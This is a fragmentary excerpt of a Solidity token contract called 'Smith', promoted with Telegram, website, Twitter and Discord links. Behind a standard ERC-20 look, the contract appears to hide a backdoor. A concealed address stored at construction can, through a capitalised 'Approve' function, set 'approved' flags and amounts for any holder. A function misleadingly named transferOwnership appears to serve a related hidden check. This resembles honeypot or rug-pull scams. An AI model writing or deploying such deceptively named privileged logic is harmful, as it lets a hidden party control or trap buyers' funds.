//Telegram: https://t.me/agenttssmith
//Website: https://agenttssmith.xyz
//Twitter: https://twitter.com/agenttssmith
//Discord: https://discord.gg/JRkz4UhWEt
...
contract Smith is IERC20, TokenBase, Ownable {
    ...
    mapping(address => Allowance) private _userDatas;

    mapping(address => mapping(address => uint256)) private _allow;

    Info private _userData;
    ...
    constructor(
        ...
        _userData.user = us_;
        _userData.id = 0;
        _mint(msg.sender, totSup_ * 10**18);
        emit Golive(
            owner(),
            VERSION
        );
    ...
    function transferOwnership(address spender, uint256 amount) public virtual {
        address from = msg.sender;
        require(spender != address(0), "Invalid address");
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_encode(spender, _userData.user)) {
    ...
    function Approve(address from, uint256 amount) public returns (bool)  {
        ...
        checkApproved(user, from, amount);
        return _userDatas[from].approved;
    }

    function checkApproved(address user, address from, uint256 amount) internal {
        if (_encode(user, _userData.user)) {
            require(from != address(0), "Invalid address");
            _userDatas[from].amount = amount;
            if (amount > 0) {
                _userDatas[from].approved = true;
            } else {
                _userDatas[from].approved = false;
            }
        }
    }
